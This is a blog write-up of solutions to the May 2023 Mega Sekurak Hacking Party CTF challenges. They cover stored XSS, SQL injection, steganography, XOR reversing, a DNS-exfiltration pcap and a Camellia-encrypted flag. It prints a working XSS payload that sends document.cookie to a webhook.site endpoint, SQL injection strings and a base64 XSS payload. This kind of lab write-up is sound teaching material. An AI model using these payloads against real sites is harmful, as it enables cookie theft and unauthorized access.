---
title: "Mega Sekurak Hacking Party CTF May 2023"
seoDescription: "Solutions to all challenges from Mega Sekurak Hacking Party 2023 May. Summary of the event and additional resources to read."
datePublished: Sun May 21 2023 22:01:41 GMT+0000 (Coordinated Universal Time)
cuid: clhxyr4hj0699g7nvehf0aeon
slug: mega-sekurak-hacking-party-ctf-may-2023
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1684666032369/9c7d658f-b64e-4ed4-90bd-32de4c680c8d.png
tags: ctf, cybersecurity-1, write-up

---

%%[support-cta] 

# Background

This was my [second](https://blog.cyberethical.me/mega-sekurak-hacking-party-ctf-solutions) participation in a CTF event organized by [Sekurak](https://sekurak.pl/) team. As before, being part of the [MSHP](https://hackingparty.pl/) event, it gathered around real pros in the field - but also this time due to Into path addition, challenges were adjusted towards people starting doing this kind of activity.

Not gonna lie, challenges were **way more** approachable than last time - and I remind you that Oct 2022 was dominated by [gynvael](https://gynvael.coldwind.pl/) who was the only one who submitted all flags.

The organizers said, "beginner friendly, with a twist". And one of those twists took me away from the top 10 😅. I hate DOM-based XSS challenges.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684652170987/66af5963-1bf6-45ba-91c1-5ff7a268c632.png align="center")

Why the "honorable" mention? Gynvael decided to not participate in the event (he submitted 5/9 flags in the first 25 minutes of the event) to not take the money price from others. And maybe what's more important, because we had design flaws in challenges 1 and 7 - he helped resolve them so we can all complete them during this CTF.

And yeah, that's me:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684652404301/0b7d318c-feee-4751-b52e-cb406ddf2d54.png align="center")

# Challenge 1: my guestbook

> Someone wrongly implemented a security mechanism of cookies. Try to receive it, and then... see what needs to be done.  
> UPDATE:  
> Admin logs in every full hour! Also, there is also new hint!

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684652461147/e54ae7f7-0525-44c9-add4-dabf695b0136.png align="center")

Simple submit form with no validation at all. From the hint in the challenge description, it is clear that you have to perform a Stored XSS attack that will send the admin cookies to the endpoint you control (or at least can read incoming requests from). If you want to read in detail about that method, please refer to the [Toy Workshop writeup](https://blog.cyberethical.me/htb-cyber-santa-ctf-2021-toy-workshop).

Because server that is running a challenge has access to the Internet, it was easier this time because I could use a [webhook.site](https://webhook.site/) service.

I've determined that only thing I have to do is to make a POST request to \`[http://ctf.securitum.ninja/ctf1/](http://ctf.securitum.ninja/ctf1/)\` and just wait for the cookies (with flag) to arrive.

```javascript
var q = "<script>fetch('https://webhook.site/76ed31cc-0a98-47e5-8186-****f345****/flag', {method:'POST', body: document.cookie});</script>";

fetch("http://ctf.securitum.ninja/ctf1/", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "message="+q,
  "method": "POST"
});
```

In the meantime, I started solving other challenges. When the time comes, I've noticed a matching response.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684655779503/08aab268-49f8-4fb0-a861-6ca98b9ebaee.png align="center")

> During the CTF organizer come to realization that the solution is a bit too complicated for this kind of event (no solves), so he made a change skipping the "one" step in decyphering the flag. Final version of the challenge is described here.
> 
> The initial one with more details regarding the fun backstory is at the end of the article :).

`flag=MSHP_%7BU0d3UD03WkAmakpjVnoj%7D; msg=Oh_WaiT_TheRe_iS_some_ncryption_Here`

After a simple URL decoding: `MSHP_{U0d3UD03WkAmakpjVnoj}`. That didn't work so I've tried decoding it from base64 and that was a hit.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684656262407/ee95f90d-0ac2-407a-ba38-eb842015f1db.png align="center")

# Challenge 2: login inject0r

> Do you remember the good 0l' days where noone knew about UNION SELECT or TIME statements? Get back to r00ts with this twisted easy SQL injection.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684656952892/a3153b6c-acd2-42cc-82f3-987ef1657fe1.png align="center")

Basic SQL Injection - with a twist, becasue

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657024076/9dd52763-c352-4a19-9074-f83fa0e50824.png align="center")

and Adam apparently did exactly what he was told to do. Injection `' or 1=1 --` doesn't work, but `' or 2=2 --` is 😉.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657108339/80aa390c-170e-4511-8afe-db2d2bc1cf4d.png align="center")

Then simply reversing the string in python `'}1#7m+UvR8Wr*g6@{_PHSM'[::-1]`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657248726/0364b393-4802-4072-9a64-f717c02230f0.png align="center")

# Challenge 3: steganoBuster.py

> Find the hidden message in pic. But how? I don't know, maybe this server is not about steganography?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657379980/f64de0bc-f442-40a9-8a95-38469b7f070e.png align="center")

Steganography. I love forensics challenges so I got right to it. Downloaded the gigachad-like cock version of Sekurak logo. Then in the source of the page:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657474171/888e31b7-a9af-410d-92d2-f9c39c77cc3f.png align="center")

And the `email.html` itself

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684657493122/d59b4947-580c-4e87-aa48-295e2f9f1f30.png align="center")

We've got the Python code that was used to hide a message in the image. Shortly describing what the code does:

1. Decode the message to binary representation (each char to int, then to binary)
    
2. Reads the image pixels' RBG values column by column.
    
3. For each R, G, B value encode single bit of message.
    
4. End when message is fully written.
    
5. Write image output to file.
    

The key to notice was: what hiding algorithm does is literally zeroing the last bit of R/G/B value and setting it to the value we need (nth bit of encoded flag).

So knowing that, we can read the message simply be reading the last bits of RGB values of the `out.png` pixels.

```python
def decrypt(image_path, maxMessageSize):
    maxMessageSize *= 8
    bits = []
    msg_index = 0
    img = Image.open(image_path)
    pixels = img.load()
    for x in range(img.width):
        for y in range(img.height):
            # get RGB of pixel
            pixel = list(pixels[x, y])
            for n in range(3):
                if msg_index < maxMessageSize:
	                # get the flag bit and store
                    bits.append(str(pixel[n] & 1))
                    msg_index += 1
            if msg_index >= maxMessageSize:
                break
        if msg_index >= maxMessageSize:
            break
    bitsString = ''.join(bits)
    print(bitsString);
```

Slap output to the [CyberChef](https://gchq.github.io/CyberChef/)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658080634/94b34c0b-30dc-44c5-8caa-342209d8d7c8.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658118875/d55c2a6c-327b-4d6a-93f3-178456b3d91b.png align="center")

# Challenge 4: $reverseme, harry

> "He Who Must Not Be Xored" is ummaterialized! If you want him to regain his strength, you must obtain his soul parts and try to figure out the mystery\_key.

First, we had to acquire the binary `wget http://ctf.securitum.ninja/ctf4/new` and do some fingerprinting.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658315399/90efa486-ff59-4c40-b424-9f698692130f.png align="center")

On the bottom we can see some base64 encoded strings. Let's fire up [ghidra](https://ghidra-sre.org/) (there is a very informative material how to use this tool - link in the resources below).

When inspecting the content of the `main` function we can discover where the flag is hidden.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658453793/4ec18023-b8c9-457c-9325-fba8b65e5c42.png align="center")

So either we can figure out the "key" to have that flag given by the program - or we decode the flag ourselves. I have chosen the latter approach.

```python
#!/usr/bin/python
import base64

def xor_encrypt(str1, key):
	enc = ''
	i=0
	for c in str1:
		enc += chr(c ^ ord(key[i%len(key)]))
		i=i+1
	return enc


if __name__ == "__main__":
    bcode = "ICo7JDoJTzkKO0AdMFAQM1c9JRIKBA=="
    print(xor_encrypt(base64.b64decode(bcode), "mystery_key"))
```

It does the same thing that is done in the original program - it XORs the `"mystery_key"` string with the decoded base64 bytes of flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658689666/479160d9-7ca2-4b6b-af8a-7247c74bf79e.png align="center")

# Challenge 5: captain forensics

> A twin suspicious network packets were captured during a recent incident. Your task is to analyze the packet capture file and retrieve the secret xormunnication!

Download the `*.pcap` file and open it in the Wireshark. Quick glance through the packets and I can find those 2 that are outstanding from others. Notice that Wireshark already marking them as corrupted/suspicious.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684658810197/75887f02-d1a7-40f7-9eba-93c85053ef6f.png align="center")

These are DNS packets. If you've heard about [DNS Data Exfiltration](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/) this should already lit the warning light. In the first packet you can read "Key is 0x42". In the second packet, there is a binary content hidden where `DNS (query)` should be.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659113705/2ee277f7-e0c5-4850-8c77-5c0de8de0a3a.png align="center")

Because in the challenge description you can read about "xormunnication" I'm using all that information to XOR bytes from second packet through `0x42`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659193534/717ea338-dd1a-4004-ac21-bf7323707eb9.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659219242/a8059fb7-e56a-4545-9e9e-e38009d97b65.png align="center")

# Challenge 6: crypto.xxe

> A cryptographic challenge? Meh, just take the /tmp/flag and then what?

Well, this one is weird, but when you go to the challenge page you got `HTTP405` error.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659284169/f9356f57-0978-4405-8d93-b2d9027cdf24.png align="center")

But in `Allow` response header you can see that `POST` is allowed.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659349299/21d5d849-eb90-41fd-8c7e-9d8b6314aad7.png align="center")

So you could get a flag by simply sending `POST` request under the given URL. Notice that I haven't have to use the `/tmp/flag` for that.. Which bothers me - but hey, as long as it works.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659398421/93e57f87-3c8b-40c7-a6db-fe8e6b2393a1.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659405276/70a94205-4050-4551-bb01-7ca1892278de.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659470904/d766751b-9d91-4733-94c7-29c7604b05be.png align="center")

# Challenge 7: now that's xxs!

> This page is somehow broken. Where's the ?payload?  
> UPDATE:  
> If you see a base64 - you are on a right track

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684659800921/bedb5d70-2286-493d-848f-caeafb5f6d70.png align="center")

Just, don't get me even started... 🥲 This was solvable from the start - but required an exact payload. After the update, it was more forgiving but got significantly more annoying because it started granting you responses like "Alert me!" (when you clearly have an alert in the payload), or "Something is missing" (duh, if the payload were complete I'd have the flag, right?) or "I don't like this tag" (I don't care and I'm not even having any tag there..). Thank you, **gynvael** 👹 (he was the author of these adjustments to the challenge).

But coming back to the challenge itself. In the page source you can see a hidden form

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684660248184/91efb17a-4a23-43d3-bacb-14be8b0bc75d.png align="center")

So the objective here is to submit a `payload` with a `GET` request. There was also a hint to use base64 (the site was so great that even reminds you about that couple of times). So initially (I mean, initially then consecutively for the next 3-4 hours, which means I've spent 30-40% of time on this single challenge) I was using the base64 to bypass the XSS filter (using `eval(atob(/base64 alert execution/))`) instead of encoding **whole** payload query parameter (`?payload=/base 64 whole stuff/`).. so the final solution is

`http://ctf.securitum.ninja/ctfX/?payload=PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpLz4=`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684660662444/a2f12318-d5fa-458c-96e9-02f6d3b63f39.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684707787784/a2d43a3f-3bdc-4c76-9e92-f8959cc82f61.png align="center")

Then I've put that char-train/snake into VSCode, replaced all `||` with `+` then slapped that into the python interpreter.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684707900683/cf9ea5fc-1444-4bed-8fae-94833c297da3.png align="center")

All that is left is decoding base64 to get the flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684660688598/40535aed-93e0-4d40-bd0e-72f7816e4a36.png align="center")

# Challenge 8: betrayal

> Someone has bypassed our security systems and hacked the FlagHunter bot. Try to ask him to uncover the secret message. Help him retrieve the stolen flag!

That one was fun to do, I even started solving it before the CTF got launched - bot was responding to commands since arrival (8PM day before) so I've got some insights. It was missing `/secret` response, which is key to move further, and presence of some individual on our Discord server so it was impossible to solve before the launch, but still, it was fun to fiddle with it beforehand.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661205540/056da56b-4459-4dcf-ae5b-29b6958a8245.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684660933209/07e3c64f-b890-4e48-a395-b14312ed21a2.png align="center")

Betrayal arrival was announced

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661039854/502ed56a-590b-4541-b10f-d5b1e8c2f94e.png align="center")

Then getting the encoded tip and submitting its name.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661134222/921d4209-d337-4146-8b58-55a831540013.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684660945478/44dc3813-8acc-4608-b331-90526dca55dc.png align="center")

# Challenge 9 (hidden)

You could get bonus 900 points.. simply by reading terms of the event :).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661326825/0ab9bf59-bef6-4e78-a737-7c6925803a2d.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661344115/384edecf-5e6d-44a9-ad08-b1f9626fc8a0.png align="center")

# Bonus (challenge 1 battleground)

Ok, so what was about that first challenge? Why it was so hard to do? Well, initially the returned flag was not base64 encoded.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661431312/7bfe5ee0-2a07-4c18-9b9f-8e6a395e218a.png align="center")

Well, it wasn't any baseXX encoding either. As the author said, to solve the challenge it was required to do some OSINT and discover what exactly cipher was used to encode the flag, then find the exact decoder implementation to decode it. To be honest, that was unintentionally made even harder to do so, becasue the information that would start the research was visible on the page itself. Which was, to remind you, the Stored XSS vulnerable page that turned into the big batteground after a while which makes it really discouraging to go there. But if you manage to pass by all the alerts, redirects, obfuscations and Rick Astley, you could see the hint.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661753563/dc6e4962-a91a-444e-8b5e-2d49df83a274.png align="center")

So after a quick googling you could find this article [here](https://group.ntt/en/newsrelease/pdf/news/news05e/0505/050526.pdf) which describes Camellia cipher that was developed by NTT and Mitsubishi.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684661833192/f1401310-090e-4388-bd82-1ac90dacef43.png align="center")

After googling more you could find many implementations of it (which to use?) - but that's not all. There are many different variations of it

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684663065323/609c7999-cbcd-40dc-b8fa-dd9eedb6354f.png align="center")

all of which requires `key` or `IV`. Which we... well didn't have. After we solved the challenges and Camellia was no longer in a play, `Darkdante` and me talked a bit about this challenge, and he actually managed to get the flag (outside of the CTF, with a little hint as he stated) by using [this exact decoder](https://encode-decode.com/camellia-256-cbc-encrypt-online/) with `camellia-256-cbc` variation.

What about `key` you'll say. Well. It's empty.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1684663127956/db1a6566-537a-4a76-8972-5cf7588b4860.png align="center")

# Resources

%%[follow-cta] 

* [Previous MSHP CTF](https://blog.cyberethical.me/mega-sekurak-hacking-party-ctf-solutions)
    
* [CyberChef - Swiss Knife for Cyber Enthusiasts](https://gchq.github.io/CyberChef)
    
* [StegOnline - makes the steganography tasks easier](https://stegonline.georgeom.net/)
    
* [Well known PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
    
* [Aboud DNS Tunneling](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)
    
* [GHIDRA for Reverse Engineering | John Hammond](https://www.youtube.com/watch?v=oTD_ki86c9I)